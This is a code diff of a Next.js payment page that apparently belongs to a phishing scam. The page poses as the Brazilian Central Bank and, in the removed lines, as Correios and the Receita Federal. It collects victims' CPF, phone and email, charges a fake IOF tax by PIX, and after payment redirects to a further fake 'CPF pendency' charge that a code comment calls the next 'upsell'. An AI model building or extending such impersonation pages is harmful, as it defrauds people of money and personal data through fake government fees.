@@ -23,8 +23,8 @@ import {
   CreditCard,
   ShieldCheck,
 } from "lucide-react"
-import { useState, useEffect, useCallback } from "react"
-import { useRouter } from "next/navigation"
+import { useState, useEffect, useCallback, Suspense } from "react"
+import { useSearchParams, useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 
 interface PixData {
@@ -35,8 +35,12 @@ interface PixData {
   amountCents: number
 }
 
-export default function PixPage() {
+function PixIOFContent() {
+  const searchParams = useSearchParams()
   const router = useRouter()
+  const placa = searchParams.get("placa") || ""
+  const valor = parseFloat(searchParams.get("valor") || "45.60")
+  
   const [pixData, setPixData] = useState<PixData | null>(null)
   const [loading, setLoading] = useState(true)
   const [error, setError] = useState<string | null>(null)
@@ -79,7 +83,7 @@ export default function PixPage() {
         return
       }
 
-      const response = await fetch("/api/pix", {
+      const response = await fetch("/api/pix-iof", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -89,6 +93,7 @@ export default function PixPage() {
           customerDocument: customerData.cpf,
           customerPhone: customerData.telefone,
           customerEmail: customerData.email,
+          amount: valor,
         }),
       })
 
@@ -110,7 +115,7 @@ export default function PixPage() {
     } finally {
       setLoading(false)
     }
-  }, [])
+  }, [valor])
 
   useEffect(() => {
     if (mounted) {
@@ -123,14 +128,14 @@ export default function PixPage() {
 
     const checkStatus = async () => {
       try {
-        const response = await fetch(`/api/pix?txid=${pixData.txid}`)
+        const response = await fetch(`/api/pix-iof?txid=${pixData.txid}`)
         const data = await response.json()
         if (data.success && data.status) {
           setPaymentStatus(data.status)
           if (data.status === "APPROVED") {
             // Redirecionar para próximo upsell após pagamento aprovado
             setTimeout(() => {
-              router.push(`/iof?placa=&valor=62.70`)
+              router.push(`/pendencia-cpf?placa=${placa}&valor=85.00`)
             }, 2000)
           }
         }
@@ -141,7 +146,7 @@ export default function PixPage() {
 
     const interval = setInterval(checkStatus, 5000)
     return () => clearInterval(interval)
-  }, [pixData?.txid, paymentStatus, router])
+  }, [pixData?.txid, paymentStatus, router, placa])
 
   const copyToClipboard = async () => {
     if (!pixData?.copiaECola) return
@@ -216,34 +221,13 @@ export default function PixPage() {
 
       {/* Main Content */}
       <main className="max-w-4xl mx-auto px-4 py-6">
-        {/* Breadcrumb */}
-        <nav className="flex items-center gap-2 mb-4 tracking-normal text-base">
-          <span className="md:hidden">
-            <a href="/" className="text-blue-600 hover:underline">
-              {"<"}
-            </a>
-            <span className="text-[#004069] ml-1">Pagamento PIX</span>
-          </span>
-          <div className="hidden md:flex items-center gap-2 text-blue-600">
-            <a href="/" className="hover:underline">
-              Portal Correios
-            </a>
-            <span className="text-[#004069]">{">"}</span>
-            <a href="/" className="hover:underline">
-              Rastreamento
-            </a>
-            <span className="text-[#004069]">{">"}</span>
-            <span className="text-[#004069]">Pagamento PIX</span>
-          </div>
-        </nav>
-
         {/* Title Section */}
         <div className="bg-[#004069] text-white p-4 mb-0">
           <div className="flex items-center gap-3">
             <QrCode className="w-8 h-8 text-[#FFCB05]" />
             <div>
-              <h1 className="text-xl md:text-2xl font-bold">Pagamento via PIX</h1>
-              <p className="text-sm text-gray-200">Taxa de Liberação Aduaneira</p>
+              <h1 className="text-xl md:text-2xl font-bold">Pagamento IOF via PIX</h1>
+              <p className="text-sm text-gray-200">Imposto sobre Operações Financeiras</p>
             </div>
           </div>
         </div>
@@ -310,7 +294,7 @@ export default function PixPage() {
                 <div className="flex items-center justify-between">
                   <div>
                     <p className="text-sm text-gray-600">Beneficiário</p>
-                    <p className="font-bold text-[#004069]">Correios - Receita Federal</p>
+                    <p className="font-bold text-[#004069]">Banco Central - IOF</p>
                   </div>
                   <div className="text-right">
                     <p className="text-sm text-gray-600">Valor total</p>
@@ -445,83 +429,20 @@ export default function PixPage() {
           )}
         </div>
       </main>
-
-      {/* Footer */}
-      <footer className="bg-[#FFCB05] text-[#004069] py-8 mt-12">
-        <div className="max-w-6xl mx-auto px-4">
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <div>
-              <h3 className="font-bold mb-4 text-lg md:text-xl">Fale Conosco</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center gap-2">
-                  <FileText className="w-4 h-4" />
-                  <span className="font-medium text-sm">Registro de Manifestações</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Phone className="w-4 h-4" />
-                  <span className="font-medium text-sm">Central de Atendimento</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <ShoppingCart className="w-4 h-4" />
-                  <span className="font-medium text-sm">Soluções para o seu negócio</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <HelpCircle className="w-4 h-4" />
-                  <span className="font-medium text-sm">Suporte ao cliente com contrato</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Users className="w-4 h-4" />
-                  <span className="font-medium text-sm">Ouvidoria</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Shield className="w-4 h-4" />
-                  <span className="font-medium text-sm">Denúncia</span>
-                </li>
-              </ul>
-            </div>
-
-            <div>
-              <h3 className="font-bold mb-4 text-lg md:text-xl">Sobre os Correios</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center gap-2">
-                  <Building className="w-4 h-4" />
-                  <span className="font-medium text-sm">Identidade corporativa</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <GraduationCap className="w-4 h-4" />
-                  <span className="font-medium text-sm">Educação e cultura</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <FileText className="w-4 h-4" />
-                  <span className="font-medium text-sm">Código de ética</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Search className="w-4 h-4" />
-                  <span className="font-medium text-sm">Transparência e prestação de contas</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Lock className="w-4 h-4" />
-                  <span className="font-medium text-sm">Política de Privacidade</span>
-                </li>
-              </ul>
-            </div>
-
-            <div>
-              <h3 className="font-bold mb-4 text-lg md:text-xl">Outros Sites</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center gap-2">
-                  <ExternalLink className="w-4 h-4" />
-                  <span className="font-medium text-sm">Loja online dos Correios</span>
-                </li>
-              </ul>
-            </div>
-          </div>
-
-          <div className="text-center mt-8 pt-4 border-t border-[#e6b800]">
-            <p className="text-sm font-medium">© Copyright 2025 Correios - Todos os direitos reservados</p>
-          </div>
-        </div>
-      </footer>
     </div>
+  )
+}
+
+export default function PixIOFPage() {
+  return (
+    <Suspense
+      fallback={
+        <div className="min-h-screen bg-[#f5f3f0] flex items-center justify-center">
+          <Loader2 className="h-12 w-12 animate-spin text-[#004069]" />
+        </div>
+      }
+    >
+      <PixIOFContent />
+    </Suspense>
   )
 }
